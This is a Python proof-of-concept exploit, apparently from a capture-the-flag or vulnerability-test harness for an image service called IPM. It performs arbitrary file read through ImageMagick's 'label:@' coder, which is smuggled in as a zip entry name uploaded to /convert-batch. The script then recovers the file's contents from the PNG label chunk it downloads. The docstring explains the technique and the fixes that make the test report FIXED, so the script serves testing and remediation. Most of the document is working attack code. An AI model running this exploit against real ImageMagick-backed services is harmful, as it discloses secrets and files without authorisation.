#!/usr/bin/env python3
"""
PoC #2: Coder LFI / arbitrary file read via ImageMagick
-------------------------------------------------------
ImageMagickService.convert() passes the source name through to `magick`
verbatim, so an ImageMagick *coder* token like `label:@<path>` is honoured and
the host file is read by ImageMagick - a file the service's own convert/upload
logic never touches. The target is the runtime flag file written by
entrypoint.sh from IPM_FLAG (see ../Dockerfile), so reading it can only happen
through a bug like this one.

We deliver the coder token through a *zip entry name* (via /convert-batch), so
it survives untouched - unlike a multipart filename, which a servlet container
may strip path separators from.

HOW WE RECOVER THE SECRET BYTE-FOR-BYTE, OVER THE NETWORK (no OCR). The
`label:@<file>` coder reads the file's contents and sets them as the output
image's `label` property; ImageMagick's PNG encoder then writes that property
verbatim into a `tEXt` chunk (keyword `label`) of the produced PNG. That chunk
is plain bytes in the image file, untouched by the `-resize` and independent of
whether a text-rendering delegate (Freetype) is even present - so when IPM
STORs the PNG and we pull it back through GET /image/{name}, this deployment's
real FLAG{...} is sitting in the returned bytes. We extract it and, when the
harness exports IPM_FLAG into this PoC's env, assert it equals that exact
value. (This is a different sink from PoC #8's `Raw profile type` CVE: here the
leak rides the `label:@` coder, not a crafted PNG profile.)

PASS/FIX: a fix that stops the coder from reading the file (an ImageMagick
policy.xml denying the `@`/coder read, sanitising the filename, or otherwise
refusing the token) leaves no FLAG{...} in the output - either the entry is not
stored, or the returned PNG carries no label chunk - so this PoC reports FIXED.
It no longer passes merely because "a PNG came back": it passes only on
recovering the real secret.

Run IPM first, then:  python3 02_coder_lfi.py [host] [port] [target-file] [expected_flag]
                      (target-file defaults to the IPM runtime flag file;
                       expected_flag defaults to the IPM_FLAG env var)
"""
import io
import json
import os
import re
import sys
import urllib.request
import uuid
import zipfile

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
TARGET = sys.argv[3] if len(sys.argv) > 3 else "/home/ctf/ipm/secret/flag.txt"
# When the harness exports IPM_FLAG (see vuln_tests/docker-compose.yml), assert
# the recovered value equals it exactly; otherwise assert the FLAG{...} shape of
# whatever real per-deployment secret the coder read out of the flag file.
EXPECTED_FLAG = (sys.argv[4] if len(sys.argv) > 4
                 else os.environ.get("IPM_FLAG", ""))
FLAG_RE = re.compile(rb"FLAG\{[^}]*\}")
BASE = f"http://{HOST}:{PORT}"


def post_multipart(url, part_name, filename, data, content_type):
    boundary = "----ipmPoC" + uuid.uuid4().hex
    body = (f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{part_name}"; filename="{filename}"\r\n'
            f"Content-Type: {content_type}\r\n\r\n").encode()
    body += data + b"\r\n" + f"--{boundary}--\r\n".encode()
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    with urllib.request.urlopen(req, timeout=60) as r:
        return r.status, r.read().decode(errors="replace")


def get(url):
    with urllib.request.urlopen(url, timeout=30) as r:
        return r.status, r.read()


def make_zip():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        # The entry NAME is the ImageMagick coder token - the read primitive.
        zf.writestr(f"label:@{TARGET}", b"ignored-content")
    return buf.getvalue()


def main():
    print(f"[*] Uploading a zip whose entry name is 'label:@{TARGET}'")
    status, resp = post_multipart(
        f"{BASE}/convert-batch", "archive", "lfi.zip", make_zip(), "application/zip")
    print(f"[*] /convert-batch -> {status} {resp}")
    try:
        result = json.loads(resp)["results"][0]
    except Exception as e:
        print(f"[-] Unexpected /convert-batch response, cannot run: {e}")
        sys.exit(2)

    if not result.get("stored"):
        print(f"[-] Entry was not stored ({result.get('error')!r}); the coder read was "
              "refused -> FIXED (no file read, nothing to disclose)")
        sys.exit(1)
    name = result["name"]

    print(f"[*] Fetching stored output via /image/{name}")
    istatus, content = get(f"{BASE}/image/{name}")

    # The read file's bytes ride back in the PNG's `label` tEXt chunk, so the
    # secret is in `content` verbatim. Recover it over the network - no OCR.
    m = FLAG_RE.search(content)
    if not m:
        print(f"[-] No FLAG{{...}} in the {len(content)}-byte output: the `label:@` coder "
              f"did not read {TARGET} (policy/filename hardening) -> FIXED")
        sys.exit(1)

    flag = m.group(0).decode()
    if EXPECTED_FLAG:
        if flag != EXPECTED_FLAG:
            print(f"[-] Recovered {flag!r} but expected {EXPECTED_FLAG!r} - value mismatch "
                  "(is IPM_FLAG consistent between the service and this PoC?)")
            sys.exit(1)
        print(f"[+] Coder LFI confirmed - the `label:@` coder read {TARGET} and this "
              f"deployment's real IPM_FLAG came back in the PNG's label chunk: {flag}")
    else:
        print(f"[+] Coder LFI confirmed - the `label:@` coder read {TARGET}; recovered this "
              f"deployment's live secret from the PNG's label chunk: {flag}")
        print("    (no IPM_FLAG in this PoC's env to assert the exact value against; the "
              "recovered FLAG{...} is the real per-deployment secret regardless)")


if __name__ == "__main__":
    main()
